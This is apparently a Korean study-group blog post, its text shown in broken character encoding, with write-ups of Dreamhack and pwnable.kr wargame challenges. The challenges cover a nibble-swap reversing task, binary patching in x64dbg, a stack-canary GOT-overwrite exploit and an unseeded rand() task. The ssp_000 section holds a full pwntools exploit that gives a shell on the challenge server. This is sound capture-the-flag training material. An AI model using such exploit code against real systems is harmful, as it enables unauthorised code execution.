---
title: "[CAUTION] ìŠ¤í„°ë”” - 12"
categories:
  - study
tags:
  - dreamhack
  - pwnable
toc: true
toc_sticky: true
toc_label: "ìŠ¤í„°ë”” - 12"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/caution2.jpg
---

ğŸ’¡ Caution ìŠ¤í„°ë”” 12íšŒì°¨
{: .notice--warning}

# ì•”í˜¸í•™ - 1

**[Pseudo7Roulette](https://dreamhack.io/wargame/challenges/195/)**


# ë¦¬ë²„ì‹± - 1
**[rev-basic-4](https://dreamhack.io/wargame/challenges/18/)**

![image](https://user-images.githubusercontent.com/33647663/169644630-09b4d5ae-ea9d-487f-8080-f1b89860ebdb.png)

Input ë¬¸ìì—´ì„ ì°¾ëŠ” ë¬¸ì œì´ë‹¤. 

IDAë¡œ Input Stringì„ ì°¾ì•„ì„œ ë¬¸ìì—´ì„ ê²€ì¦í•˜ëŠ” ë¶€ë¶„ì„ ì°¾ëŠ”ë‹¤.

ë¬¸ìì—´ ê²€ì¦í•˜ëŠ” ë¶€ë¶„ì€ ë‹¤ìŒê³¼ ê°™ë‹¤. 

![image](https://user-images.githubusercontent.com/33647663/169644670-1789b097-825c-45be-9dfe-0ff9d2d5d82b.png)

í•´ë‹¹ ë¶€ë¶„ì˜ ë¡œì§ì„ ë¶„ì„í•˜ê¸° ìœ„í•´ì„œ ê°€ìƒì˜ inputì„ í†µí•´ì„œ ì–´ë–»ê²Œ ê³„ì‚°ë˜ëŠ”ì§€ í•´ë³¸ë‹¤.

ë§Œì•½ [a1+i] ê°’ì´ 8bitë¡œ abcd efgh ì´ë ‡ê²Œ ë“¤ì–´ìˆë‹¤ê³  ê°€ì •í•˜ê³  ê³„ì‚°ì„ í•´ë³¸ë‹¤. ê°€ìš´ë° or(|)ì„ ê¸°ì¤€ìœ¼ë¡œ ì™¼ìª½ ì˜¤ë¥¸ìª½ì„ ë‚˜ëˆˆë‹¤.

ë¨¼ì € ì™¼ìª½ ë¶€ë¶„ì˜ ì—°ì‚°ì€ ë‹¤ìŒê³¼ ê°™ë‹¤

16 * [a1+i] & 0xf0

ì—°ì‚°ì ìš°ì„ ìˆœìœ„ì— ì˜í•´ì„œ 16* [a1+i] ê°€ ë¨¼ì € ê³„ì‚°ë˜ê³ , 0xf0ê³¼ and ë¹„íŠ¸ì—°ì‚°ì´ ìˆ˜í–‰ëœë‹¤.

````
16 * [a1 + i]       => efgh 0000
efgh 0000 & 0xf0    => efgh 0000
````

ì˜¤ë¥¸ìª½ ë¶€ë¶„ì˜ ì—°ì‚°ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.

```
abcd efgh >> 4      => 0000 abcd
```

ë‘ê°œì˜ ë¹„íŠ¸ë¥¼ or ì—°ì‚°ì„ ìˆ˜í–‰í•˜ë©´ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```
efgh abcd
```

ì›ë˜ ë¹„íŠ¸ abcd efghì™€ ë¹„êµí•´ë³´ë©´ ì™¼ìª½ 4ë¹„íŠ¸ì™€ ì˜¤ë¥¸ìª½ 4ë¹„íŠ¸ê°€ ìœ„ì¹˜ê°€ ë°”ë€ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.

ê·¸ë¦¬ê³  ì´ ê°’ì„ byte_140003000[i] ì™€ ë¹„êµí•˜ê³  ìˆê³  í•´ë‹¹ ê°’ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/169644870-ef3cba98-33a1-413b-b08e-0e8ccc3dd049.png)

ë”°ë¼ì„œ ìœ„ì˜ ë°°ì—´ ê°’ì„ ì¢Œìš° ë¹„íŠ¸ë¥¼ 4ë¹„íŠ¸ì”© ë°”ê¾¸ë©´ ì›ë³¸ ë°”ì´íŠ¸ê°’ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.


ì½”ë“œë¡œ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

**sol.py**

```py
arr = [0x24,0x27,0x13,0xc6,
       0xc6,0x13,0x16,0xe6,
       0x47,0xf5,0x26,0x96,
       0x47,0xf5,0x46,0x27,
       0x13,0x26,0x26,0xc6,
       0x56,0xf5,0xc3,0xc3,
       0xf5,0xe3,0xe3]

result = []

for i in arr:
    tmp = (i << 4) & 0xff | (i >> 4) & 0xff
    result.append(chr(tmp))

for i in result:
    print(i,end = '')
```

ì‹¤í–‰ ê²°ê³¼ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/169644896-3b7f62b3-bb9a-4b25-aa8f-59fedf87b994.png)

![image](https://user-images.githubusercontent.com/33647663/169644910-25fd0163-7d01-48d4-b96e-dadeead17be8.png)

# ë¦¬ë²„ì‹± - 2
**[patch](https://dreamhack.io/wargame/challenges/49/)**

![image](https://user-images.githubusercontent.com/33647663/170251477-a79ec981-4046-47d9-87bc-614a3935a27f.png)

í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì´ë¯¸ì§€ê°€ ë‚˜ì˜¨ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170251662-b1478206-d3e5-4c00-9a25-9a1d2481ddd9.png)

ì†ŒìŠ¤ì½”ë“œë¥¼ ë¶„ì„í•´ì„œ, í”Œë˜ê·¸ ê¸€ìë¥¼ ê°€ë¦¬ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ì•¼ í•œë‹¤.


## ida
idaë¡œ ì‹¤í–‰í•´ë³´ë©´ ê·¸ë¦¼ê³¼ ê°™ì´ í•¨ìˆ˜ê°€ ê½¤ ë§ì´ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170252170-8ead39b1-5582-4680-9922-c7fc1bfa53fa.png)

í•˜ë‚˜í•˜ë‚˜ ì „ë¶€ ë¶„ì„í•  ìˆ˜ëŠ” ì—†ìœ¼ë‹ˆ, ì–´ë–¤ ë¶€ë¶„ì„ ì¤‘ì ì ìœ¼ë¡œ ë¶„ì„í• ì§€ ìƒê°í•´ë´ì•¼ í•œë‹¤.

ë¬¸ì œì—ì„œ íŒíŠ¸ë¡œ GDI+ ê´€ë ¨ëœ ë‚´ìš©ì„ ì ì–´ë†¨ê¸° ë•Œë¬¸ì—, ì´ë¥¼ ìƒê°í•˜ê³  ëª‡ê°œì˜ í•¨ìˆ˜ë¥¼ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ GDI ê´€ë ¨ í•¨ìˆ˜ê°€ ì‚¬ìš© ì¤‘ì¸ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170252393-5f7a3b2b-620b-485d-ab7e-5294e4bab74a.png)

ë¨¼ì € sub_1400030a0 í•¨ìˆ˜ë¥¼ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤. 

![image](https://user-images.githubusercontent.com/33647663/170252839-46b11060-8f41-4f5e-8058-985f84132368.png)

ë‚˜ë„ gdi ê´€ë ¨ëœ í”„ë¡œê·¸ë˜ë°ì„ í•´ë³¸ì ì´ ì—†ê¸° ë•Œë¬¸ì— ì–´ë–¤ ì‹ìœ¼ë¡œ ì½”ë“œê°€ íë¥´ëŠ”ì§€ëŠ” ëª¨ë¥´ì§€ë§Œ, 36ë²ˆì§¸ ì¤„ì„ ë³´ë©´, GdiplusStartup í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆë‹¤. ì´ë¦„ìœ¼ë¡œë¶€í„° ìœ ì¶”ë¥¼ í•´ë³´ë©´ ì´ ë¶€ë¶„ì—ì„œ startë¥¼ í•˜ê³  ìˆìœ¼ë‹ˆê¹Œ ì´ ì§€ì ì„ ì‹œì‘ìœ¼ë¡œ ì½”ë“œë¥¼ ë”°ë¼ê°€ë³´ë©´ ì¶”ê°€ì ìœ¼ë¡œ ê·¸ë¦¼ì„ ê·¸ë¦¬ëŠ” ì½”ë“œë¥¼ ë§Œë‚  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. 

í•˜ì§€ë§Œ, gdiplusstartupí•¨ìˆ˜ ë’¤ì—ìˆëŠ” ë¶€ë¶„ì„ ë´ë„ ë”°ë¡œ í•¨ìˆ˜ë¥¼ callí•˜ê³  ìˆì§„ ì•Šì•„ì„œ ë‹¤ìŒì—” ì–´ë””ë¥¼ ë¶„ì„í•´ì•¼ í•  ì§€ ê³ ë¯¼í•´ ë´ì•¼ í•œë‹¤.

sub_1400030a0í•¨ìˆ˜ ì´ë¦„ì„ gdi_main ìœ¼ë¡œ ë°”ê¾¸ê³  ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ì„ ì¶”ê°€ì ìœ¼ë¡œ ë¶„ì„í•´ ë³¸ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170253893-f1adb310-09fd-4bab-8f85-40d0f0a64844.png)

ìœ„ì˜ í•¨ìˆ˜ ëª©ë¡ì„ ì˜ ë³´ë©´, ëŒ€ë¶€ë¶„ ê°™ì€ í˜•íƒœì˜ êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆë‹¤.

ì„ì˜ë¡œ 2ê°œë¥¼ ì„ íƒí•´ì„œ ë¹„êµí•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170253965-52c50fae-e5e9-444d-a38e-31461835d213.png)

![image](https://user-images.githubusercontent.com/33647663/170254090-141be922-dc54-40b8-a2bd-1bd7e071f9dd.png)

ê·¸ëƒ¥ ë˜‘ê°™ì´ ìƒê²¼ê³ , í•¨ìˆ˜ë“¤ì˜ ì´ë¦„ì„ ë³´ë©´, gdipê´€ë ¨ëœ í•¨ìˆ˜ì™€ GdipDrawLineI í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ ê·¸ë¦¼ì„ ê·¸ë¦¬ëŠ” í•¨ìˆ˜ë“¤ ì…ë‹ˆë‹¤.

ì´ í•¨ìˆ˜ë“¤ì„ ì–´ë””ì—ì„œ í˜¸ì¶œí•˜ëŠ”ì§€ ì¶”ì ì„ í•´ë³´ë©´ sub_140002C40 í•¨ìˆ˜ê°€ ë‚˜ì˜¨ë‹¤. í•´ë‹¹ í•¨ìˆ˜ë¥¼ ë³´ë‹ˆ ë‹¤ìŒê³¼ ê°™ì´ ìƒê²¼ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170254744-38f25576-81e8-4578-8375-0fb2e7031e54.png)

sub_140002B80 í•¨ìˆ˜ë¥¼ ì—¬ëŸ¬ë²ˆ í˜¸ì¶œí•˜ê³  ê·¸ ì•„ë˜ì—ì„œ ì¶”ê°€ì ì¸ í•¨ìˆ˜ë“¤ì„ ë¶€ë¥´ê³  ìˆë‹¤. ì´ ë¶€ë¶„ì´ ê·¸ë¦¼ì„ ê·¸ë¦¬ëŠ” ì½”ë“œì¸ê²ƒì´ ëª…í™•í•´ ë³´ì´ë‹ˆ ì´ì œ ì–´ë–»ê²Œ ë‹µì„ ì•Œì•„ë‚¼ ì§€ ìƒê°í•´ë³´ì.

1. ì •ì  ë¶„ì„ : ì½”ë“œì— ë“¤ì–´ê°„ ì¸ì ê°’ë“¤ì´ ë‹¤ ì£¼ì–´ì¡Œìœ¼ë‹ˆ í•´ë‹¹ ì¸ìê°’ë“¤ì„ ë‹¤ ê¸°ë¡í•œ ë’¤ ë‹¤ë¥¸ í”„ë¡œê·¸ë¨ì—ì„œ ì§€ìš°ëŠ” ë¶€ë¶„ì„ ì•Œì•„ë‚´ê³  í•´ë‹¹ ë¶€ë¶„ì„ ì œê±°í•˜ì—¬ í”Œë˜ê·¸ë¥¼ ì•Œì•„ë‚¸ë‹¤.
2. ë™ì  ë¶„ì„ : ë””ë²„ê±°ë¥¼ ì—°ê²°í•˜ì—¬, íŠ¹ì • ë¶€ë¶„ì—ì„œ ì½”ë“œ íë¦„ì„ ë°”ê¿”ì„œ ê·¸ë¦¼ì„ ë®ì–´ì“°ëŠ” ë¶€ë¶„ì„ í˜¸ì¶œí•˜ì§€ ì•Šë„ë¡ í•œë‹¤.

1,2ë²ˆ ë‘ê°€ì§€ ë°©ë²•ì´ ê°€ëŠ¥í•œë°, ë‚˜ëŠ” ì € ë¶€ë¶„ì„ ë™ì¼í•˜ê²Œ êµ¬í˜„í•  ì—„ë‘ê°€ ì•ˆë‚˜ì„œ ë™ì  ë¶„ì„ìœ¼ë¡œ ë¬¸ì œë¥¼ í’€ì—ˆë‹¤.

## x64dbg

x64dbgë¥¼ ì´ìš©í•˜ë©´ ì½”ë“œ ì¤‘ê°„ë¶€ë¶„ì„ ë°”ê¿”ì„œ íŒ¨ì¹˜ë¥¼ í•  ìˆ˜ ìˆë‹¤. ë¨¼ì € idaì—ì„œ ì°¾ì€ ì—¬ëŸ¬ í•¨ìˆ˜ë“¤ì„ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ì•¼ í•œë‹¤.

idaì—ì„œëŠ” sub_140002C40ì˜€ëŠ”ë° ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ 140002c40ì´ë¼ëŠ” ëœ»ì´ë‹¤. x64dbgë¡œ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì‹œì‘ ì£¼ì†Œê°€ ë‹¤ë¥¸ë° ì–´ì°¨í”¼ ì½”ë“œìƒì—ì„œëŠ” ìƒëŒ€ ì£¼ì†Œê°€ ê°™ì„ ê²ƒì´ê¸° ë•Œë¬¸ì— ì‹œì‘ì£¼ì†Œë¥¼ ë¹„êµí•´ì„œ ê·¸ ì°¨ì´ë§Œí¼ ë”í•´ì£¼ë©´ ë  ê²ƒì´ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170259338-c4e33c4b-ddcb-43dc-bf28-75a2629d7a58.png)

ë³´ë©´ xdbgë„ ëì— 4ìë¦¬ë§Œ ë³´ë©´ ì‹œì‘ì´ 1000ì´ê³ , idaë„ ì‹œì‘ì´ 1000ì´ë‹¤. ë”°ë¼ì„œ sub_140002c40ì€ xdbgì—ì„œë„ ëì´ 2c40ì´ë‹¤.

í•´ë‹¹ ì£¼ì†Œë¡œ ì ‘ê·¼í•˜ì—¬ ë³´ë‹ˆ ë‹¤ìŒê³¼ ê°™ì´ ë°˜ë³µì ìœ¼ë¡œ patch.7ff759d72b80í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170259604-5d8bd6ab-f7b0-4af2-9315-da4926d49866.png)

ì´ì œ ì´ ë¶€ë¶„ì„ ë™ì‘í•˜ì§€ ì•Šë„ë¡ ë°”ê¿”ì¤„ ê²ƒì´ë‹¤.

ì˜ˆìƒí•˜ê¸°ë¡œëŠ” ë™ì¼í•˜ê²Œ í˜¸ì¶œë˜ëŠ” patch.7ff759d72b80 í•¨ìˆ˜ê°€ ê·¸ë¦¼ì„ ê°€ë¦¬ëŠ” ì½”ë“œë¼ ìƒê°ë˜ì„œ ì´ ë¶€ë¶„ë“¤ì„ ì „ë¶€ nopìœ¼ë¡œ ë®ì–´ì¨ì¤„ ê²ƒì´ë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ ë°˜ë³µì  í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì„ ëª¨ë‘ ì„ íƒí•œ ë’¤, nopìœ¼ë¡œ ë°”ê¿”ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170260270-ac01dc02-22b3-4147-81df-d51f77935077.png)

![image](https://user-images.githubusercontent.com/33647663/170260427-74b2b6e4-ccbd-4989-8b4b-5cf3b277c155.png)

íŒŒì¼ íŒ¨ì¹˜ë¥¼ ëˆŒëŸ¬ì„œ ë³€ê²½ëœ í”„ë¡œê·¸ë¨ì„ ë‹¤ì‹œ ì €ì¥í•´ ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/170260495-a0b2df44-2cfd-435a-b50e-9b07f2daf334.png)

ì €ì¥ëœ í”„ë¡œê·¸ë¨ì„ í˜¸ì¶œí•´ ì£¼ë©´ ë

![image](https://user-images.githubusercontent.com/33647663/170260665-230a5a35-57aa-4651-af97-04c60b7ca6a5.png)

# ì‹œìŠ¤í…œ - 1

**[ssp_000](https://dreamhack.io/wargame/challenges/32/)**

ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}
```

bof ì·¨ì•½ì ì´ ìˆëŠ”ê±´ í•œëˆˆì— ë³´ì´ëŠ”ë°, ì–´ë–»ê²Œ ê³µê²©ì„ í• ì§€ ìƒê°í•´ ë³´ê¸° ìœ„í•´ì„œ ìŠ¤íƒì„ ë¨¼ì € ê·¸ë ¤ë³¸ë‹¤.

ë©”ì¸í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”ì„ í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ë°, ìŠ¤íƒì„ í™•ì¸í•˜ê¸° ìœ„í•œ ì¤‘ìš”ë¶€ë¶„ì€ ì£¼ì„ìœ¼ë¡œ í‘œì‹œí•´ ë†¨ë‹¤.

```sh
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004008fb <+0>:	push   rbp
   0x00000000004008fc <+1>:	mov    rbp,rsp
   0x00000000004008ff <+4>:	sub    rsp,0x70
   0x0000000000400903 <+8>:	mov    DWORD PTR [rbp-0x64],edi
   0x0000000000400906 <+11>:	mov    QWORD PTR [rbp-0x70],rsi
   0x000000000040090a <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400913 <+24>:	mov    QWORD PTR [rbp-0x8],rax  //canary ë¥¼ rbp-8ì— ì €ì¥
   0x0000000000400917 <+28>:	xor    eax,eax
   0x0000000000400919 <+30>:	lea    rdx,[rbp-0x50]
   0x000000000040091d <+34>:	mov    eax,0x0
   0x0000000000400922 <+39>:	mov    ecx,0x8
   0x0000000000400927 <+44>:	mov    rdi,rdx
   0x000000000040092a <+47>:	rep stos QWORD PTR es:[rdi],rax
   0x000000000040092d <+50>:	mov    eax,0x0
   0x0000000000400932 <+55>:	call   0x40088e <initialize>
   0x0000000000400937 <+60>:	lea    rax,[rbp-0x50]       // bufì˜ ìœ„ì¹˜ëŠ” rbp-80
   0x000000000040093b <+64>:	mov    edx,0x80
   0x0000000000400940 <+69>:	mov    rsi,rax
   0x0000000000400943 <+72>:	mov    edi,0x0
   0x0000000000400948 <+77>:	call   0x400710 <read@plt>
   0x000000000040094d <+82>:	mov    edi,0x400a55
   0x0000000000400952 <+87>:	mov    eax,0x0
   0x0000000000400957 <+92>:	call   0x4006f0 <printf@plt>
   0x000000000040095c <+97>:	lea    rax,[rbp-0x60]     // valueì˜ ìœ„ì¹˜ëŠ” rbp-96
   0x0000000000400960 <+101>:	mov    rsi,rax
   0x0000000000400963 <+104>:	mov    edi,0x400a5d
   0x0000000000400968 <+109>:	mov    eax,0x0
   0x000000000040096d <+114>:	call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400972 <+119>:	mov    edi,0x400a61
   0x0000000000400977 <+124>:	mov    eax,0x0
   0x000000000040097c <+129>:	call   0x4006f0 <printf@plt>
   0x0000000000400981 <+134>:	lea    rax,[rbp-0x58]       // addrì˜ ìœ„ì¹˜ëŠ” rbp-88
   0x0000000000400985 <+138>:	mov    rsi,rax
   0x0000000000400988 <+141>:	mov    edi,0x400a5d
   0x000000000040098d <+146>:	mov    eax,0x0
   0x0000000000400992 <+151>:	call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400997 <+156>:	mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040099b <+160>:	mov    rdx,rax
   0x000000000040099e <+163>:	mov    rax,QWORD PTR [rbp-0x58]
   0x00000000004009a2 <+167>:	mov    QWORD PTR [rdx],rax
   0x00000000004009a5 <+170>:	mov    eax,0x0
   0x00000000004009aa <+175>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:	xor    rcx,QWORD PTR fs:0x28    // ë©”ì¸í•¨ìˆ˜ê°€ ëë‚˜ê¸°ì „ì— canaryê°’ì´ ë³€í–ˆëŠ”ì§€ í™•ì¸
   0x00000000004009b7 <+188>:	je     0x4009be <main+195>
   0x00000000004009b9 <+190>:	call   0x4006d0 <__stack_chk_fail@plt>    //ë³€í–ˆìœ¼ë©´, stack_chk_fail í•¨ìˆ˜ í˜¸ì¶œ
   0x00000000004009be <+195>:	leave  
   0x00000000004009bf <+196>:	ret    
End of assembler dump.
```

ê·¸ë¦¼ìœ¼ë¡œ í‘œí˜„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/169549704-436490d3-c0da-4725-a6d6-f5a8166cb2d0.png)


í˜„ì¬ readì—ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ì„ ì´ 0x80byteë¥¼ ë°›ê¸° ë•Œë¬¸ì— retì£¼ì†Œê¹Œì§€ ì¶©ë¶„íˆ ë®ì„ ìˆ˜ ìˆë‹¤.

í•˜ì§€ë§Œ í˜„ì¬ canaryê°’ì„ ì•Œì•„ë‚¼ ë°©ë²•ì´ ì—†ê¸° ë•Œë¬¸ì— retì£¼ì†Œë¥¼ ë®ìœ¼ë©´ canary ê²€ì‚¬ë¡œ í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œëœë‹¤.

ì´ë²ˆ ë¬¸ì œì—ì„œ ì¤‘ìš”í•œ ë¶€ë¶„ì€ ë‹¤ìŒ ë¶€ë¶„ì´ë‹¤.

```c
*(long *)addr = value;
```

ìœ„ì˜ í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë©´ ì–´ë–»ê²Œ ë˜ëŠ”ì§€ ìƒê°í•´ë³´ë©´, addr ë³€ìˆ˜ì— ë“¤ì–´ìˆëŠ” ê°’ì„ valueê°’ìœ¼ë¡œ ë°”ê¿€ ìˆ˜ ìˆë‹¤.

ì‚¬ìš©ì ì…ë ¥ìœ¼ë¡œ addr, valueë¥¼ ëª¨ë‘ ë°›ê³  ìˆê¸° ë•Œë¬¸ì— ê²°êµ­ ì–´ë– í•œ ë©”ëª¨ë¦¬ ê³µê°„ì´ë“  ì›í•˜ëŠ” ê°’ìœ¼ë¡œ ë°”ê¿€ ìˆ˜ ìˆë‹¤.

ì´ë¥¼ ì´ìš©í•´ì„œ gotë¥¼ get_shell()í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ ë°”ê¾¸ë©´ íŠ¹ì • í•¨ìˆ˜ê°€ ì‹¤í–‰ë ë•Œ, get_shell()í•¨ìˆ˜ê°€ í˜¸ì¶œ ë  ê²ƒì´ë‹¤.

ê·¸ëŸ¬ë©´ ì–´ë– í•œ í•¨ìˆ˜ì˜ gotë¥¼ ë°”ê¿”ì•¼ í• ì§€ ìƒê°í•´ë³´ì.

```c
*(long *)addr = value;
```

ìœ„ì˜ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ê³  ë‚œ ë’¤, í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë‹ˆ ë‹¤ìŒê³¼ ê°™ì´ stack_chk_fail ë°–ì— ì—†ë‹¤.

```s
// main í•¨ìˆ˜ì˜ ë””ìŠ¤ì–´ì…ˆë¸”
   0x0000000000400997 <+156>:	mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040099b <+160>:	mov    rdx,rax
   0x000000000040099e <+163>:	mov    rax,QWORD PTR [rbp-0x58]
   0x00000000004009a2 <+167>:	mov    QWORD PTR [rdx],rax  // *(long *)addr = value; ì‹¤í–‰ ë¶€ë¶„
   0x00000000004009a5 <+170>:	mov    eax,0x0
   0x00000000004009aa <+175>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:	je     0x4009be <main+195>
   0x00000000004009b9 <+190>:	call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:	leave  
   0x00000000004009bf <+196>:	ret    

```

 ê·¸ëŸ¬ë©´ ìš°ë¦¬ëŠ” í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë„ë¡ ìœ ë„í•˜ê³ , í•´ë‹¹ í•¨ìˆ˜ì˜ gotë¥¼ get_shell()í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ ë°”ê¿”ì£¼ë©´ ëœë‹¤.

ì •ë¦¬í•˜ë©´ ë‹¤ìŒì˜ ì ˆì°¨ë¡œ ìµìŠ¤í”Œë¡œì‡ í•œë‹¤.

1. Bufì— bof ì·¨ì•½ì ìœ¼ë¡œ canaryë¥¼ ì¹¨ë²”í•˜ì—¬ ë‚˜ì¤‘ì— stack_chk_fail@pltí•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë„ë¡ í•œë‹¤.
2. Addr ë³€ìˆ˜ì— stack_chk_failì˜ got ì£¼ì†Œë¥¼, value ë³€ìˆ˜ì— get_shell()ì˜ ì£¼ì†Œë¥¼ ì €ì¥í•˜ì—¬ *Addr = value ê°€ ì‹¤í–‰ë˜ë©´ stack_chk_failì˜ gotë¥¼ get_shell() ì£¼ì†Œë¡œ ë®ì–´ì“°ë„ë¡ í•œë‹¤.
3. Canary ê°’ì˜ ë³€ê²½ì´ í™•ì¸ë˜ì–´ stack_chk_fail@pltê°€ ì‹¤í–‰ë˜ë©´ get_shell()í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ê²Œ ë˜ì–´ shellì„ íšë“í•œë‹¤.


ì‘ì„±í•œ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤. 

**ex.py**

```py
from pwn import *

#p = process("./ssp_000")
p = remote("host1.dreamhack.games",10835)
e = ELF("./ssp_000")

got_addr = e.got['__stack_chk_fail']
get_shell_addr = 4196586 

p.sendline(b'A'*73) #canary wordë¥¼ ì¹¨ë²”
p.recvuntil("Addr : ")

# Addr = got of __stack_chk_fail
p.sendline(str(got_addr).encode()) #stack_chk_failì˜ got

p.recvuntil("Value : ")
p.sendline(str(get_shell_addr).encode())  # get_shell()ì˜ ì£¼ì†Œ

p.interactive()
```


![image](https://user-images.githubusercontent.com/33647663/169551508-2b3ba2c4-c194-4fc1-b01e-3f17f4b14a45.png)

# ì‹œìŠ¤í…œ - 2

**[random](https://pwnable.kr/play.php)**


```c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}
```

ì´ë²ˆ ë¬¸ì œëŠ” rand()í•¨ìˆ˜ì— ëŒ€í•´ ì•Œê³  ìˆìœ¼ë©´ ì‰¬ìš´ ë¬¸ì œì´ë‹¤.

rand()í•¨ìˆ˜ëŠ” ëœë¤ê°’ì„ ìƒì„±í•´ ì£¼ëŠ” í•¨ìˆ˜ì¸ë°, seedê°’ì„ ì£¼ì§€ ì•ŠëŠ”ë‹¤.

ì´ ë§ì€ ëœë¤ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ í–ˆì„ ë•Œ, ì²« ë²ˆì§¸, ë‘ ë²ˆì§¸, ì„¸ ë²ˆì§¸, ... ê·¸ ì´í›„ ê°’ë“¤ì€ ëœë¤í•˜ê²Œ ë‚˜ì˜¤ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ë‚˜.. rand()í•¨ìˆ˜ë¥¼ ë™ì¼í•˜ê²Œ ë‹¤ì‹œ ì‹œì‘í•˜ë©´ ì²« ë²ˆì§¸, ë‘ ë²ˆì§¸, ì„¸ ë²ˆì§¸ ê°’ì´ ê°™ê²Œ ë‚˜ì˜¨ë‹¤. ë‹¤ìŒ ì‹¤í–‰í™”ë©´ì„ ë³´ë©´ ì´í•´í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

**rand.c**

```
#include <stdio.h>

int main(){
	printf("%d\n",rand());
	printf("%d\n",rand());
	printf("%d\n",rand());
	printf("%d\n",rand());
	printf("%d\n",rand());
}
```

![image](https://user-images.githubusercontent.com/33647663/169638536-20cc42f9-e71e-47d2-b362-68b3c4b34c69.png)

ì´ ë‚´ìš©ì„ ì´í•´í•˜ê³  ë¬¸ì œë¥¼ ë‹¤ì‹œ ë³´ì.

```c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!
  // random valueê°€ ì•„ë‹Œ, rand()í•¨ìˆ˜ ì‹¤í–‰ì‹œ ì²˜ìŒ ë‚˜ì˜¤ëŠ” ê°’ìœ¼ë¡œ ì¼ì •
	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

```

